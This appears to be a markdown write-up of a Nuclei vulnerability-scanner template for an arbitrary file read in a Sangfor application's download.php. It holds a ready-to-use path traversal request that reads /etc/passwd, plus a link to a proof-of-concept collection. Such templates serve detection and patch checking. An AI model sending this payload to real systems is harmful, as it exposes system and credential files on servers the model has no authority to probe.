# Nuclei Template: Sangfor Application download.php - Arbitary File Read
**Template ID:** sangfor-download-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`sangfor-download-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the Sangfor Application download.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/report/download.php?pdf=../../../../../etc/passwd
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md?plain=1
